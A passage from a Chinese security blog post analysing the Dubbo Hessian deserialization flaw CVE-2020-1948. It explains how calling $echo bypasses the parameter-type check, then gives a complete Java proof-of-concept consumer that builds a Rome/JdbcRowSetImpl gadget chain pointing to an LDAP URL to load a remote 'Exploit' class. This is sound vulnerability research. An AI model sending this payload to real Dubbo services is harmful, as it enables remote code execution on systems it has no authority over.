+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!RpcUtils.isGenericCall(path, getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, getMethodName())) &#123;</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Service not found:&quot;</span> + path + <span class="string">&quot;, &quot;</span> + getMethodName());</span><br><span class="line">    &#125;</span><br><span class="line">    pts = ReflectUtils.desc2classArray(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 pts 是一个参数类型匹配的机制，用来检测传输的参数类型跟本地配置的是否一致，如果不一致则会检测调用方法名，如果要调用的方法不是 $invoke、$invokeAsync 或者 $echo 就会直接报错退出。</p>
+<p>其实这个验证压根不影响反序列化漏洞的利用，因为反序列化在函数函数调用之前就已经进行了，所以我们可以通过控制方法名来进行反序列化攻击，修改接口中的方法名为 $echo（$invoke 会有消费者这边的问题），然后修改消费者类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboAutoConfigurationConsumerBootstrap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DubboReference(</span></span><br><span class="line"><span class="meta">            version = &quot;1.0.0&quot;,</span></span><br><span class="line"><span class="meta">            url = &quot;dubbo://127.0.0.1:12345&quot;,</span></span><br><span class="line"><span class="meta">            timeout = 100</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> DemoService demoService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;replacement&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">        Object[] hashMapTable = (Object[])getFieldValue(hashMap, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">hashMapNode</span> <span class="operator">=</span> hashMapTable[<span class="number">1</span>];</span><br><span class="line">        setFieldValue(hashMapNode, <span class="string">&quot;key&quot;</span>, equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DubboAutoConfigurationConsumerBootstrap.class).close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ApplicationRunner <span class="title function_">runner</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> args -&gt; logger.info(demoService.$echo(getPoc()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样一发入魂。</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.jianshu.com/p/93c00a391e09">Dubbo序列化与反序列化</a></p>
+<p><a href="https://paper.seebug.org/1264">CVE-2020-1948打印错误触发toString-1</a></p>
+<p><a href="https://www.cnblogs.com/ph4nt0mer/p/13185549.html">CVE-2020-1948打印错误触发toString-2</a></p>
+<p><a href="https://www.freebuf.com/articles/web/241401.html">CVE-2020-1948的两种触发方式</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Dubbo/">Dubbo</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Hessian/">Hessian</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/07/15/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-001/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>struts2系列漏洞 S2-001</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/07/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <span>Hessian反序列化漏洞</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Dubbo反序列化漏洞&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
